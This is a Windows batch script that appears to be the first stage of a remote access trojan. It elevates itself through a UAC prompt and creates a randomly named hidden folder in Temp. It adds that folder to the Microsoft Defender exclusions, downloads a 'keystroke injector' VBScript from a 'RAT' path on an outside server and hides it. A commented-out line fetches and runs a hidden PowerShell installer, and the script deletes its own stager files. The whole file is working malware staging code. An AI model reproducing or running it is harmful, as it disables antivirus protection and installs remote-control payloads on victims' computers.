@echo off

::---------------------------------------------------------------------------------------------------------------
::  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
:: --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt

    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

::----------------------------------------------------------------------------------------------------------------

setlocal enabledelayedexpansion
:: Set the length of the random string
set LENGTH=7
set CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set "MainDirName="

for /L %%i in (1,1,%LENGTH%) do (
    set /A "RANDOM_INDEX=!random! %% 62"
    for %%c in (!RANDOM_INDEX!) do (
        set "RANDOM_CHAR=!CHARSET:~%%c,1!"
    )
    set "MainDirName=!MainDirName!!RANDOM_CHAR!"
)
::----------------------------------------------------------------------------------------------------------------

SET TARGETDIR="C:\Users\Arth\AppData\Local\Temp\"
cd %TARGETDIR%

::----------------------------------------------------------------------------------------------------------------
mkdir %MainDirName%
powershell Add-MpPreference -ExclusionPath 'C:\Users\Arth\AppData\Local\Temp\%MainDirName%'
::----------------------------------------------------------------------------------------------------------------
cd %MainDirName%
:: -----------------------------------------------------------cmd-------------------------------------------------------------------------

:: download Keystroke Injector
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile payload.vbs"
attrib +h "payload.vbs"
:: payload.vbs

:: -------------------------------------------------------------------------------------------------------------------------------------
:: -----------------------------------------------------------ps1--------------------------------------------------------------------------

::powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/installer.ps1' -OutFile installer.ps1"
::attrib +h "installer.ps1"
::powershell -windowstyle hidden -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"

:: -------------------------------------------------------------------------------------------------------------------------------------

cd "%~dp0"
::comment to stop self del
if exist initial.cmd del initial.cmd
if exist module_downloader.cmd del module_downloader.cmd